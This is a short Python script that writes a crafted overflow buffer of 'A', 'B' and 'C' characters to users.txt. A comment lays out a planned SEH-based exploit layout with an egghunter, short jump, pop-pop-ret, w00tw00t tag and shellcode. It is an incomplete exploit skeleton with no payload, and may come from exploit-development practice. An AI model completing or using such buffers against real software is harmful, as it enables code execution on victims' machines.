#!/usr/bin/python

nops = "A" * 386 + "B" * 4 + "C" * 30 
buff = nops  

#[nops][ egghunter][short jmp (nseh)][seh (pop pop ret)][nops][w00tw00t][shellcode]

f = open("users.txt",'w')
f.write(buff)
f.close()